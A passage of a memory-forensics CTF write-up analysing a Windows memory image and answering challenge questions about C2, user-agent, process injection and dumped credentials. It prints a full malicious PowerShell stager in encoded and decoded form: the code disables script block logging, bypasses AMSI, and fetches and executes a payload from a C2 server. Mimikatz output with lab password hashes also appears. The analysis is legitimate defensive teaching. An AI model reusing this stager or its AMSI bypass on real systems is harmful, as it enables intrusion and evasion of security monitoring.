SABTAGUAVABbAHMAdABSAEkATgBnAF0AKQApAH0AJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAUwBzAGUAbQBCAGwAWQAuAEcAZQB0AFQAWQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBFAHQARgBpAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEATABVAEUAKAAkAE4AdQBMAEwALAAkAHQAUgBVAEUAKQA7AH0AOwBbAFMAWQBzAHQAZQBtAC4ATgBFAHQALgBTAGUAUgB2AGkAQwBFAFAATwBJAG4AVABNAGEATgBBAGcARQBSAF0AOgA6AEUAWABwAEUAYwB0ADEAMAAwAEMAbwBuAHQASQBOAFUARQA9ADAAOwAkADcAYQA2AEUARAA9AE4ARQB3AC0ATwBiAGoARQBjAFQAIABTAHkAcwB0AGUATQAuAE4AZQBUAC4AVwBlAEIAQwBsAGkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAA3AEEANgBFAGQALgBIAEUAYQBEAEUAUgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA3AEEANgBlAEQALgBQAFIAbwBYAFkAPQBbAFMAeQBzAHQARQBtAC4ATgBFAHQALgBXAEUAYgBSAGUAcQBVAGUAUwB0AF0AOgA6AEQARQBGAGEAVQBsAFQAVwBlAEIAUABSAG8AWABZADsAJAA3AGEANgBFAEQALgBQAHIATwB4AHkALgBDAHIARQBkAEUAbgBUAEkAQQBsAFMAIAA9ACAAWwBTAHkAcwBUAGUATQAuAE4ARQBUAC4AQwByAGUARABFAG4AdABpAGEATABDAGEAYwBoAGUAXQA6ADoARABlAGYAQQBVAGwAVABOAEUAdABXAE8AUgBLAEMAcgBlAGQARQBuAFQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA3AGEANgBlAGQALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBNAC4AVABFAFgAdAAuAEUAbgBDAG8AZABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAFkAdABlAFMAKAAnADMANQA4ADgAZQA1AGIAOQA4AGIAMQAwADUAMQBlAGUANgBkAGMANwA3ADQAOABmADEAMwA0ADcANAA5ADgANwAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwB1AE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAFgAdAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBVAG4AaQBjAE8AZABlAC4ARwBlAFQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAFYARQByAFQAXQA6ADoARgByAE8AbQBCAGEAUwBFADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABjAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBAHUAQQBEAEUAQQBPAFEAQQAwAEEAQwA0AEEATQBRAEEAeQBBAEQAawBBAE8AZwBBADQAQQBEAEEAQQAnACkAKQApADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQANwBBADYARQBEAC4ASABlAEEAZABlAFIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBUAEQAYQBNAE4ARABOAD0AagBZAEoASAB5AGcAdgBZAFYASwB5AHEAZQBJAEIAZAB1AHoASwBVADIAbgBEAFQASAB5AGMAPQAiACkAOwAkAGQAQQB0AEEAPQAkADcAYQA2AGUARAAuAEQATwBXAG4ATABPAGEAZABEAGEAVABhACgAJABzAGUAcgArACQAdAApADsAJABpAFYAPQAkAEQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAEQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAEQAQQB0AEEALgBMAGUAbgBHAHQAaABdADsALQBqAE8AaQBOAFsAQwBIAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
+</code></pre><p>Other, not so professional way, could be by dumping the process memory and grepping it out of the file:</p><pre tabindex=0><code>~$ vol.py -f finalboss.mem --profile=Win10x64_17763 memdump -p 3908 -D memdump   
+Volatility Foundation Volatility Framework 2.6.1
+************************************************************************
+Writing powershell.exe [  3908] to 3908.dmp
+~$ strings 3908.dmp|grep powershell|head -n1
+powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAFIAUwBpAG8AbgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAUwBJAE8ATgAuAE0AYQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJAAxADEAQgBEADgAPQBbAFIARQBGAF0ALgBBAHMAUwBlAE0AQgBsAFkALgBHAEUAdABUAHkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBlAFQARgBpAEUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQAMQAxAGIARAA4ACkAewAkAGEAMQA4AGUAMQA9ACQAMQAxAGIAZAA4AC4ARwBlAFQAVgBBAGwAVQBFACgAJABuAHUAbABMACkAOwBJAGYAKAAkAGEAMQA4AGUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkAEEAMQA4AEUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABBADEAOABlADEAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJABWAGEAbAA9AFsAQwBPAEwATABlAEMAdABpAG8ATgBzAC4ARwBlAG4AZQByAEkAYwAuAEQAaQBDAFQAaQBPAG4AQQByAFkAWwBzAHQAUgBpAG4AZwAsAFMAeQBzAHQARQBNAC4ATwBCAGoAZQBDAHQAXQBdADoAOgBuAEUAdwAoACkAOwAkAFYAQQBsAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAYQBsAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAQQAxADgARQAxAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAHYAYQBMAH0ARQBMAHMARQB7AFsAUwBjAHIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcARQB0AEYASQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbAB1AEUAKAAkAE4AdQBMAGwALAAoAE4AZQB3AC0ATwBiAEoARQBDAFQAIABDAG8AbABsAGUAQwBUAGkATwBuAHMALgBHAEUAbgBFAHIASQBjAC4ASABhAHMASABTAGUAVABbAHMAdABSAEkATgBnAF0AKQApAH0AJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAUwBzAGUAbQBCAGwAWQAuAEcAZQB0AFQAWQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBFAHQARgBpAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEATABVAEUAKAAkAE4AdQBMAEwALAAkAHQAUgBVAEUAKQA7AH0AOwBbAFMAWQBzAHQAZQBtAC4ATgBFAHQALgBTAGUAUgB2AGkAQwBFAFAATwBJAG4AVABNAGEATgBBAGcARQBSAF0AOgA6AEUAWABwAEUAYwB0ADEAMAAwAEMAbwBuAHQASQBOAFUARQA9ADAAOwAkADcAYQA2AEUARAA9AE4ARQB3AC0ATwBiAGoARQBjAFQAIABTAHkAcwB0AGUATQAuAE4AZQBUAC4AVwBlAEIAQwBsAGkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAA3AEEANgBFAGQALgBIAEUAYQBEAEUAUgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA3AEEANgBlAEQALgBQAFIAbwBYAFkAPQBbAFMAeQBzAHQARQBtAC4ATgBFAHQALgBXAEUAYgBSAGUAcQBVAGUAUwB0AF0AOgA6AEQARQBGAGEAVQBsAFQAVwBlAEIAUABSAG8AWABZADsAJAA3AGEANgBFAEQALgBQAHIATwB4AHkALgBDAHIARQBkAEUAbgBUAEkAQQBsAFMAIAA9ACAAWwBTAHkAcwBUAGUATQAuAE4ARQBUAC4AQwByAGUARABFAG4AdABpAGEATABDAGEAYwBoAGUAXQA6ADoARABlAGYAQQBVAGwAVABOAEUAdABXAE8AUgBLAEMAcgBlAGQARQBuAFQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA3AGEANgBlAGQALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBNAC4AVABFAFgAdAAuAEUAbgBDAG8AZABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAFkAdABlAFMAKAAnADMANQA4ADgAZQA1AGIAOQA4AGIAMQAwADUAMQBlAGUANgBkAGMANwA3ADQAOABmADEAMwA0ADcANAA5ADgANwAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwB1AE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAFgAdAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBVAG4AaQBjAE8AZABlAC4ARwBlAFQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAFYARQByAFQAXQA6ADoARgByAE8AbQBCAGEAUwBFADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABjAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBAHUAQQBEAEUAQQBPAFEAQQAwAEEAQwA0AEEATQBRAEEAeQBBAEQAawBBAE8AZwBBADQAQQBEAEEAQQAnACkAKQApADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQANwBBADYARQBEAC4ASABlAEEAZABlAFIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBUAEQAYQBNAE4ARABOAD0AagBZAEoASAB5AGcAdgBZAFYASwB5AHEAZQBJAEIAZAB1AHoASwBVADIAbgBEAFQASAB5AGMAPQAiACkAOwAkAGQAQQB0AEEAPQAkADcAYQA2AGUARAAuAEQATwBXAG4ATABPAGEAZABEAGEAVABhACgAJABzAGUAcgArACQAdAApADsAJABpAFYAPQAkAEQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAEQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAEQAQQB0AEEALgBMAGUAbgBHAHQAaABdADsALQBqAE8AaQBOAFsAQwBIAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
+</code></pre><h3 id=c2>C2</h3><blockquote><p>Q: There&rsquo;s a malware calling &ldquo;home&rdquo;. What is the C2 IP address of the malware?</p></blockquote><p>Once again, many ways to do it. I prefer decoding the PowerShell payload:</p><pre tabindex=0><code>~$ cat payload.b64|base64 -d
+If($PSVeRSionTABLE.PSVeRSION.MaJoR -GE 3){$11BD8=[REF].AsSeMBlY.GEtTyPE(&#39;System.Management.Automation.Utils&#39;).&#34;GeTFiE`Ld&#34;(&#39;cachedGroupPolicySettings&#39;,&#39;N&#39;+&#39;onPublic,Static&#39;);If($11bD8){$a18e1=$11bd8.GeTVAlUE($nulL);If($a18e1[&#39;ScriptB&#39;+&#39;lockLogging&#39;]){$A18E1[&#39;ScriptB&#39;+&#39;lockLogging&#39;][&#39;EnableScriptB&#39;+&#39;lockLogging&#39;]=0;$A18e1[&#39;ScriptB&#39;+&#39;lockLogging&#39;][&#39;EnableScriptBlockInvocationLogging&#39;]=0}$Val=[COLLeCtioNs.GenerIc.DiCTiOnArY[stRing,SystEM.OBjeCt]]::nEw();$VAl.Add(&#39;EnableScriptB&#39;+&#39;lockLogging&#39;,0);$Val.Add(&#39;EnableScriptBlockInvocationLogging&#39;,0);$A18E1[&#39;HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB&#39;+&#39;lockLogging&#39;]=$vaL}ELsE{[ScrIptBlOcK].&#34;GEtFIe`Ld&#34;(&#39;signatures&#39;,&#39;N&#39;+&#39;onPublic,Static&#39;).SEtVAluE($NuLl,(New-ObJECT ColleCTiOns.GEnErIc.HasHSeT[stRINg]))}$Ref=[Ref].ASsemBlY.GetTYPe(&#39;System.Management.Automation.Amsi&#39;+&#39;Utils&#39;);$Ref.GEtFieLD(&#39;amsiInitF&#39;+&#39;ailed&#39;,&#39;NonPublic,Static&#39;).SetVaLUE($NuLL,$tRUE);};[SYstem.NEt.SeRviCEPOInTMaNAgER]::EXpEct100ContINUE=0;$7a6ED=NEw-ObjEcT SysteM.NeT.WeBCliEnt;$u=&#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#39;;$7A6Ed.HEaDERS.Add(&#39;User-Agent&#39;,$u);$7A6eD.PRoXY=[SystEm.NEt.WEbReqUeSt]::DEFaUlTWeBPRoXY;$7a6ED.PrOxy.CrEdEnTIAlS = [SysTeM.NET.CreDEntiaLCache]::DefAUlTNEtWORKCredEnTials;$Script:Proxy = $7a6ed.Proxy;$K=[SysTEM.TEXt.EnCodinG]::ASCII.GetBYteS(&#39;3588e5b98b1051ee6dc7748f13474987&#39;);$R={$D,$K=$ArgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXoR$S[($S[$I]+$S[$H])%256]}};$ser=$([TeXt.EnCoDiNG]::UnicOde.GeTString([ConVErT]::FrOmBaSE64STRing(&#39;aAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAOQA0AC4AMQAyADkAOgA4ADAA&#39;)));$t=&#39;/admin/get.php&#39;;$7A6ED.HeAdeRs.ADD(&#34;Cookie&#34;,&#34;TDaMNDN=jYJHygvYVKyqeIBduzKU2nDTHyc=&#34;);$dAtA=$7a6eD.DOWnLOadDaTa($ser+$t);$iV=$Data[0..3];$Data=$data[4..$DAtA.LenGth];-jOiN[CHar[]](&amp; $R $DAta ($IV+$K))|IEX
+</code></pre><p>Kinda ugly output, let&rsquo;s beautify it:</p><pre tabindex=0><code>If($PSVeRSionTABLE.PSVeRSION.MaJoR - GE 3) {
+    $11BD8 = [REF].AsSeMBlY.GEtTyPE(&#39;System.Management.Automation.Utils&#39;).
+    &#34;GeTFiE`Ld&#34;(&#39;cachedGroupPolicySettings&#39;, &#39;N&#39; + &#39;onPublic,Static&#39;);
+    If($11bD8) {
+        $a18e1 = $11bd8.GeTVAlUE($nulL);
+        If($a18e1[&#39;ScriptB&#39; + &#39;lockLogging&#39;]) {
+            $A18E1[&#39;ScriptB&#39; + &#39;lockLogging&#39;][&#39;EnableScriptB&#39; + &#39;lockLogging&#39;] = 0;
+            $A18e1[&#39;ScriptB&#39; + &#39;lockLogging&#39;][&#39;EnableScriptBlockInvocationLogging&#39;] = 0
+        }
+        $Val = [COLLeCtioNs.GenerIc.DiCTiOnArY[stRing, SystEM.OBjeCt]]::nEw();
+        $VAl.Add(&#39;EnableScriptB&#39; + &#39;lockLogging&#39;, 0);
+        $Val.Add(&#39;EnableScriptBlockInvocationLogging&#39;, 0);
+        $A18E1[&#39;HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB&#39; + &#39;lockLogging&#39;] = $vaL
+    }
+    ELsE {
+        [ScrIptBlOcK].
+        &#34;GEtFIe`Ld&#34;(&#39;signatures&#39;, &#39;N&#39; + &#39;onPublic,Static&#39;).SEtVAluE($NuLl, (New - ObJECT ColleCTiOns.GEnErIc.HasHSeT[stRINg]))
+    }
+    $Ref = [Ref].ASsemBlY.GetTYPe(&#39;System.Management.Automation.Amsi&#39; + &#39;Utils&#39;);
+    $Ref.GEtFieLD(&#39;amsiInitF&#39; + &#39;ailed&#39;, &#39;NonPublic,Static&#39;).SetVaLUE($NuLL, $tRUE);
+};
+[SYstem.NEt.SeRviCEPOInTMaNAgER]::EXpEct100ContINUE = 0;
+$7a6ED = NEw - ObjEcT SysteM.NeT.WeBCliEnt;
+$u = &#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#39;;
+$7A6Ed.HEaDERS.Add(&#39;User-Agent&#39;, $u);
+$7A6eD.PRoXY = [SystEm.NEt.WEbReqUeSt]::DEFaUlTWeBPRoXY;
+$7a6ED.PrOxy.CrEdEnTIAlS = [SysTeM.NET.CreDEntiaLCache]::DefAUlTNEtWORKCredEnTials;
+$Script: Proxy = $7a6ed.Proxy;
+$K = [SysTEM.TEXt.EnCodinG]::ASCII.GetBYteS(&#39;3588e5b98b1051ee6dc7748f13474987&#39;);
+$R = {
+    $D,
+    $K = $ArgS;$S = 0. .255;0. .255 | % {
+        $J = ($J + $S[$_] + $K[$_ % $K.COuNT]) % 256;$S[$_],
+        $S[$J] = $S[$J],
+        $S[$_]
+    };$D | % {
+        $I = ($I + 1) % 256;$H = ($H + $S[$I]) % 256;$S[$I],
+        $S[$H] = $S[$H],
+        $S[$I];$_ - bXoR$S[($S[$I] + $S[$H]) % 256]
+    }
+};
+$ser = $([TeXt.EnCoDiNG]::UnicOde.GeTString([ConVErT]::FrOmBaSE64STRing(&#39;aAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAOQA0AC4AMQAyADkAOgA4ADAA&#39;)));
+$t = &#39;/admin/get.php&#39;;
+$7A6ED.HeAdeRs.ADD(&#34;Cookie&#34;, &#34;TDaMNDN=jYJHygvYVKyqeIBduzKU2nDTHyc=&#34;);
+$dAtA = $7a6eD.DOWnLOadDaTa($ser + $t);
+$iV = $Data[0. .3];
+$Data = $data[4..$DAtA.LenGth]; - jOiN[CHar[]]( &amp; $R $DAta($IV + $K)) | IEX
+</code></pre><p>Alright, we can see the HTTP request HOST-part being build here:</p><pre tabindex=0><code>$ser = $([TeXt.EnCoDiNG]::UnicOde.GeTString([ConVErT]::FrOmBaSE64STRing(&#39;aAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAOQA0AC4AMQAyADkAOgA4ADAA&#39;)));
+$t = &#39;/admin/get.php&#39;;
+$7A6ED.HeAdeRs.ADD(&#34;Cookie&#34;, &#34;TDaMNDN=jYJHygvYVKyqeIBduzKU2nDTHyc=&#34;);
+$dAtA = $7a6eD.DOWnLOadDaTa($ser + $t);
+</code></pre><p>The full C2 URL:</p><pre tabindex=0><code>http://172.16.194.129:80/admin/get.php
+</code></pre><p>We can also see the IP address in netscan output:</p><pre tabindex=0><code>~$ cat netscan.txt|grep 172.16.194.129
+0x980f73f0fbe0     TCPv4    172.16.194.128:49977           172.16.194.129:80    CLOSED           -1    
+</code></pre><p>Strings also provide us the full requests send to C2 address:</p><pre tabindex=0><code>~$ strings -a finalboss.mem &gt; Q: strings_ascii.txt
+~$ grep &#34;Host: 172.16.194.129&#34; -B3 -A1 strings_ascii.txt
+GET /login/process.php HTTP/1.1
+Cookie: session=5Advbi+/4r1L9BNUzLTNybtcy1k=
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Connection: Keep-Alive
+--
+GET /admin/get.php HTTP/1.1
+Cookie: session=/PotPTX63p/C1HPgKpkcm+QRRWY=
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Connection: Keep-Alive
+--
+GET /login/process.php HTTP/1.1
+Cookie: session=MmbeesIwk8I37sqq47aA2qA1LwA=
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Connection: Keep-Alive
+--
+AfdB
+POST /admin/get.php HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Content-Length: 190
+--
+GET /login/process.php HTTP/1.1
+Cookie: session=PuGsY08kmiAsLNCDyUCZ1o1xC2E=
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Connection: Keep-Alive
+</code></pre><p>The answer: 172.16.194.129</p><h3 id=stage-1>Stage #1</h3><blockquote><p>Q: The malware downloads stager from 172.16.194.129 the first time. What is the URI the malware connects to (for the first time)?</p></blockquote><p>We already found out the full URI in the previous assignment:</p><pre tabindex=0><code>$ser = $([TeXt.EnCoDiNG]::UnicOde.GeTString([ConVErT]::FrOmBaSE64STRing(&#39;aAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAOQA0AC4AMQAyADkAOgA4ADAA&#39;)));
+$t = &#39;/admin/get.php&#39;;
+$7A6ED.HeAdeRs.ADD(&#34;Cookie&#34;, &#34;TDaMNDN=jYJHygvYVKyqeIBduzKU2nDTHyc=&#34;);
+$dAtA = $7a6eD.DOWnLOadDaTa($ser + $t);
+</code></pre><p>The full C2 URL:</p><pre tabindex=0><code>http://172.16.194.129:80/admin/get.php
+</code></pre><p>The answer: /admin/get.php</p><h3 id=stage-2>Stage #2</h3><blockquote><p>Q: The malware calls &ldquo;home&rdquo; constantly after that. What is the URI the malware is contacting?</p></blockquote><p>We can see the malware populating following C2 URI after the first download:</p><pre tabindex=0><code>GET /login/process.php HTTP/1.1
+Cookie: session=MmbeesIwk8I37sqq47aA2qA1LwA=
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Connection: Keep-Alive
+</code></pre><p>The answer: /login/process.php</p><h3 id=agent>Agent</h3><blockquote><p>Q: There&rsquo;s a malware calling &ldquo;home&rdquo;. What is the user-agent the malware is using?</p></blockquote><p>From the previous challenges:</p><pre tabindex=0><code>GET /login/process.php HTTP/1.1
+Cookie: session=MmbeesIwk8I37sqq47aA2qA1LwA=
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Connection: Keep-Alive
+</code></pre><p>The answer: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko</p><h3 id=injection>Injection</h3><blockquote><p>Q: One of the processes was injected. What is the process id (PID) of that process?</p></blockquote><p>In this case, there was no clear file signatures available in the malfind output.</p><p>However, malfind has way to dump ERW sections for further analysis:</p><pre tabindex=0><code>~$ vol.py -f finalboss.mem --profile=Win10x64_17763 malfind -D malfind
+</code></pre><p>After that we can grep the MZ header from hex dump:</p><pre tabindex=0><code>~$ hexdump -C *|grep -i &#34;4d 5a&#34;      
+00002350  c3 ff ff ff 48 8b f8 8d  75 01 b8 4d 5a 00 00 66  |....H...u..MZ..f|
+00003b50  cc cc cc 48 83 ec 18 4c  8b c1 b8 4d 5a 00 00 66  |...H...L...MZ..f|
+000144c0  8b c1 b9 4d 5a 00 00 66  39 08 74 03 33 c0 c3 48  |...MZ..f9.t.3..H|
+</code></pre><p>The file header seems to be there but in odd location.</p><p>The svchost.exe also has &ldquo;This program can not be run in DOS mode.&rdquo; basic header that is in every PE format executable.</p><p>The answer is the PID: 7736</p><h3 id=password>Password</h3><blockquote><p>Q: What is Rodrigo Gonzales&rsquo; password?</p></blockquote><p>This is another tricky one for a reason&mldr; The person who made the dump (not me) screw up the password spelling. :D</p><p>However, it was solvable&mldr; Let&rsquo;s figure it out:</p><p>We can see from the strings that Mimikatz has been executed on the system:</p><pre tabindex=0><code>~$ strings -e l finalboss.mem &gt; Q: strings_utf.txt
+~$ grep -i &#34;sekurlsa&#34; strings_utf.txt
+mimikatz(powershell) # sekurlsa::logonpasswords
+~$ grep -i &#34;mimikatz(powershell) # sekurlsa::logonpasswords&#34; -A100 strings_utf.txt
+mimikatz(powershell) # sekurlsa::logonpasswords
+Authentication Id : 0 ; 1076056 (00000000:00106b58)
+Session           : Interactive from 1
+User Name         : Rodrigo Gonzales
+Domain            : WORKSTATION
+Logon Server      : WORKSTATION
+Logon Time        : 12/02/2020 22.54.23
+SID               : S-1-5-21-2034586335-2782532192-897599191-1001
+	msv :
+	 [00000003] Primary
+	 * Username : Rodrigo Gonzales
+	 * Domain   : WORKSTATION
+	 * NTLM     : 8ab015e5cc1302d061dfefe6fb3dce12
+	 * SHA1     : b2ecd0de4dc885e66ac28546558761c5e40a5ce1
+	tspkg :
+	wdigest :
+	 * Username : Rodrigo Gonzales
+	 * Domain   : WORKSTATION
+	 * Password : (null)
+	kerberos :
+	 * Username : Rodrigo Gonzales
+	 * Domain   : WORKSTATION
+	 * Password : (null)
+	ssp :
+	credman :
+Authentication Id : 0 ; 1076008 (00000000:00106b28)
